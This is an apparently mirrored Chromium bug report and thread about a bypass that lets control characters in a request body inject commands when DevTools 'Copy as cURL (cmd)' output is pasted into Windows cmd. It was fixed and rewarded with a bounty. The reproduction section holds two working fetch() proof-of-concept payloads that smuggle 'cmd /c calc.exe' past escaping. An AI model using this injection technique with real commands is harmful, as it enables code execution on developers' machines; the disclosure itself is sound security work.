# Bypass #443948855 - Allows Arbitrary Code Execution via "Copy as cURL (cmd)" in DevTools

| Field | Value |
|-------|-------|
| **Issue ID** | [455899538](https://issues.chromium.org/issues/455899538) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Network |
| **Platforms** | Windows |
| **Reporter** | we...@gmail.com |
| **Assignee** | da...@google.com |
| **Created** | 2025-10-29 |
| **Bounty** | $1,000.00 |

## Description

VULNERABILITY DETAILS

After re-checking, I discovered a way to bypass the fix from my previous report (which is marked as fixed in the latest Chrome build and Canary: <https://issues.chromium.org/issues/443948855>

The issue concerns the “Copy as cURL (cmd)” feature in Chromium DevTools. When exporting a request to Windows that includes a cmd command, the parsing logic inside escapeStringWin fails to correctly handle control characters. In the original (now-fixed) report only a few control characters were not parsed; however, in this latest build many ASCII control characters are still not parsed and therefore bypass the filtering.

VERSION

Chrome Version: 142.0.7444.60 (Official Build) (64-bit) and 143.0.7499.4 (Official Build) canary (64-bit)

Operating System: windows 11

REPRODUCTION CASE

1. Copy and run the payload in console (this can also be via html)

```
fetch("/copyme", {
  credentials: "omit",
  headers: {
    "Accept-Language": "en-US",
    "Content-Type": "text/plain",
  },
  method: "POST",
  body: `
query=evil\ncmd /c calc.exe\x1a\ncmd /c calc.exe\x1a
`
});

```

or

```
fetch("/copyme", {
  credentials: "omit",
  headers: {
    "Accept-Language": "en-US",
    "Content-Type": "text/plain",
  },
  method: "POST",
  body: `
query=evil\ncmd /c calc.exe\x0e\ncmd /c calc.exe\x0f
`
});

```

2. Copy the request with copy as curl (cmd)
3. Paste on the windows cmd and see calc pop up

## Attachments

- chrome_curl.mp4 (video/mp4, 2.9 MB)
- chromeCanary_curl.mp4 (video/mp4, 2.5 MB)

## Timeline

### ts...@google.com (2025-10-29)

Assigning per previous report.

### ch...@google.com (2025-10-30)

Setting milestone because of s2 severity.

### we...@gmail.com (2025-11-03)

no update ?

### dc...@chromium.org (2025-11-07)

Devtools team, is this worth keeping? Do we know how often people use this feature?

It seems like we should just be filtering out all control characters, i.e. `(unsigned char)c < 0x1f || (unsigned char)c == 0x7f`.

And is this a Windows-specific issue? Are we sanitizing on other platforms?

### ch...@google.com (2025-11-13)

danilsomsikov: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2025-11-13)

Project: devtools/devtools-frontend  

Branch:  main  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7150405>

Replace all non-printable characters with space, as these break cmd.exe commands as well

---


Expand for full commit details
```
     
    Bug: 455899538 
    Change-Id: I0aa5240ec25134a9b41740605232154510d1ef42 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/7150405 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org>

```

---

Files:

- M `front_end/panels/network/NetworkLogView.test.ts`
- M `front_end/panels/network/NetworkLogView.ts`

---

Hash: [dd28425cd462a7ef069f289d521af4562f3f836a](https://chromiumdash.appspot.com/commit/dd28425cd462a7ef069f289d521af4562f3f836a)  

Date: Thu Nov 13 15:44:52 2025


---

### dx...@google.com (2025-11-13)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7152801>

Roll DevTools Frontend from 21dbf0abb194 to d01fd3cbeadf (3 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/devtools/devtools-frontend.git/+log/21dbf0abb194..d01fd3cbeadf 
     
    2025-11-13 nvitkov@chromium.org [cleanup] Remove imperative x-link generation 
    2025-11-13 dsv@chromium.org Replace all non-printable characters with space, as these break cmd.exe commands as well 
    2025-11-13 paulirish@chromium.org RPP: Hide Sources' Debugger sidebar in trace_app 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/devtools-frontend-chromium 
    Please CC liviurau@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:432043754,chromium:455899538,chromium:456407878 
    Change-Id: I5db13f03d38a84ff680af1373f2f9f2883730f29 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7152801 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1544566}

```

---

Files:

- M `DEPS`
- M `third_party/devtools-frontend/src`

---

Hash: [e224059cd67fd17d6cedec5bdbcec8cdc27f42cb](https://chromiumdash.appspot.com/commit/e224059cd67fd17d6cedec5bdbcec8cdc27f42cb)  

Date: Thu Nov 13 21:49:32 2025


---

### ch...@google.com (2025-11-14)

Security Merge Request Consideration: Requesting merge to beta (M143) because latest trunk commit (1544566) appears to be after beta branch point (1536371).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [143].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### da...@google.com (2025-11-14)

@dc...@chromium.org

:sigh:, yes see the CL above.
It is windows-specific and we do sanitize on other platfroms.
Re. the usage, it has 53K MAU (out of 5.1 M MAU of the Network panel).

### we...@gmail.com (2025-11-14)

Canary 144 is already secure.

### ya...@chromium.org (2025-11-17)

danilsomsikov@ Does <https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/7150405> need merging? If so, please answer the merge questionnaire.

### da...@google.com (2025-11-18)

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/7150405>

> Has this fix been verified on Canary to not pose any stability regressions?

Yes

> Does this fix pose any potential non-verifiable stability risks?

No

> Does this fix pose any known compatibility risks?

No

> Does it require manual verification by the test team? If so, please describe required testing.

See the bug description

### ya...@chromium.org (2025-11-18)

Please proceed with the merge

### sr...@google.com (2025-11-18)

we are cutting stable RC for 143 tomorrow, so please help get this merged by earliest by 9am PST ( wednesday Nov 19)

### dx...@google.com (2025-11-19)

Project: devtools/devtools-frontend  

Branch:  chromium/7499  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7170562>

[M143] Replace all non-printable characters with space, as these break cmd.exe commands as well

---


Expand for full commit details
```
     
    Bug: 455899538 
    Change-Id: I0aa5240ec25134a9b41740605232154510d1ef42 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/7150405 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    (cherry picked from commit dd28425cd462a7ef069f289d521af4562f3f836a) 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/7170562

```

---

Files:

- M `front_end/panels/network/NetworkLogView.test.ts`
- M `front_end/panels/network/NetworkLogView.ts`

---

Hash: [4190a105897e986349694cae685b51054bf2dc51](https://chromiumdash.appspot.com/commit/4190a105897e986349694cae685b51054bf2dc51)  

Date: Thu Nov 13 15:44:52 2025


---

### we...@gmail.com (2025-11-21)

Is there no CVE for this report and the previous ones?

### we...@gmail.com (2025-11-23)

any update ?

### we...@gmail.com (2025-11-29)

any update ?

### we...@gmail.com (2025-12-02)

any update ?

### we...@gmail.com (2025-12-05)

any update ?

### we...@gmail.com (2025-12-07)

any update ?

### sp...@google.com (2025-12-08)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
Exploitation Mitigation Bypass


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-02-20)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Exploitation Mitigation Bypass

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/455899538)*
